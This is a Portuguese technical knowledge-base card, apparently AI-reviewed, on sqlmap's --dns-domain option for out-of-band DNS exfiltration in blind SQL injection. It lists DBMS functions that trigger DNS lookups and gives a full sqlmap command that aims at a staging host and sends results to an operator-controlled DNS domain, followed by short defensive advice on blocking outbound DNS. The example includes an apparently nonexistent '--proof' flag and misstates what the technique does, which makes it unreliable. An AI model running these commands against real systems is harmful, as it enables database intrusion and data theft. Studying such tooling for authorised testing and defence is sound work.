---
id: software.seguranca.tranche05.000406
tipo: tecnica
dominio: software
subdominio: seguranca
nivel: intermediario
confianca: media
ultima_verificacao: 2026-10-03
validade: volatil
status: candidata
revisao_humana: nao_solicitada
revisor: ""
revisao_ia: aprovada
revisor_ia: "Arena.ai Agent Mode"
data_revisao_ia: 2026-10-03
relatorio_revisao_ia: "knowledge-federation/exports/reports/ai-review-software-seguranca-2000-0003-tranche-05.md"
fontes: ["https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/README.md", "https://github.com/sqlmapproject/sqlmap/wiki/Usage", "https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-pt-BR.md"]
tags: [dominio/software, subdominio/seguranca, qualidade/candidata]
lote: software-seguranca-2000-0003
---

# sqlmap: Aceleração de Blind SQL Injection via Exfiltração *Out-of-Band* DNS (`--dns-domain`)

## Em uma frase
Quando um ponto vulnerável suporta apenas técnicas cegas (*Boolean-based* ou *Time-based blind*) sem retorno visual na resposta HTTP, a opção `--dns-domain` do `sqlmap` utiliza canais *Out-of-Band* (OOB) via consultas DNS iniciadas pelo próprio SGBD para validar a injeção instantaneamente.

## Por que importa
Enquanto o *Time-based blind* tradicional precisa aguardar vários segundos por bit/caractere testado, a resolução DNS OOB codifica o resultado em um subdomínio (`<hex>.attacker-controlled-domain`) e o recebe em milissegundos no servidor DNS autoritativo do auditor.

## Como funciona
O `sqlmap` levanta um servidor DNS UDP (`porta 53`) na máquina do auditor para um domínio delegado via registro `NS` (`--dns-domain=oob.secops-test.corp`) e injeta funções nativas do SGBD que disparam resolução de nomes (como `COPY ... FROM PROGRAM 'nslookup ...'` ou `dblink` no PostgreSQL, `LOAD_FILE('\\\\...')` no MySQL/Windows, `UTL_INADDR`/`UTL_HTTP` no Oracle e `xp_dirtree` no MSSQL).

## Exemplo
```bash
# Validar Blind SQLi via canal Out-of-Band DNS em servidor de teste controlado pelo Red Team
sudo python3 sqlmap.py -u "https://staging.internal.corp/track?cid=10" \
  -p cid --dbms=MSSQL \
  --technique=BT \
  --dns-domain="oob.redteam.internal.corp" \
  --proof --batch
```

## Limites e trade-offs
Do ponto de vista defensivo (Blue Team), servidores de banco de dados jamais devem ter permissão para realizar consultas DNS recursivas para domínios externos na internet nem conexões SMB/UNC de saída (`porta 445`).

## Como verificar
Bloqueie o tráfego UDP/TCP 53 externo nos segmentos de banco de dados e confirme que tentativas de `--dns-domain` falham em resolver subdomínios externos.

## Conexões
- [[sqlmap-tamper-scripts-avaliacao-regras-waf-normalizacao]] — Veja também: sqlmap: Scripts de Transformação (`--tamper`) para Avaliação de Regras de WAF e Normalização de Payloads.
- [[sqlmap-auditoria-privilegios-dba-file-system-os-shell-riscos]] — Veja também: sqlmap: Auditoria de Privilégios Excessivos de SGBD (`--is-dba`, `--privileges`, `--roles` e Vetores de File/OS Access).
- [[sqlmap-arquitetura-motor-deteccao-sql-injection-tecnicas-beustq]] — Referência cruzada direta com sqlmap-arquitetura-motor-deteccao-sql-injection-tecnicas-beustq.
- [[sqlmap-otimizacao-threads-keep-alive-null-connection-rate-delay]] — Referência cruzada direta com sqlmap-otimizacao-threads-keep-alive-null-connection-rate-delay.

## Fontes
- [sqlmap Official GitHub — README & Architecture](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/README.md) — documentação oficial do projeto sqlmap cobrindo arquitetura, instalação e escopo; consultado em 2026-10-03.
- [sqlmap Official Wiki — Usage & Switches Reference](https://github.com/sqlmapproject/sqlmap/wiki/Usage) — manual oficial de opções da CLI, técnicas BEUSTQ, --level, --risk, --tamper e OOB DNS; consultado em 2026-10-03.
- [sqlmap Official Documentation — Portuguese Reference](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-pt-BR.md) — referência oficial traduzida do sqlmap; consultado em 2026-10-03.
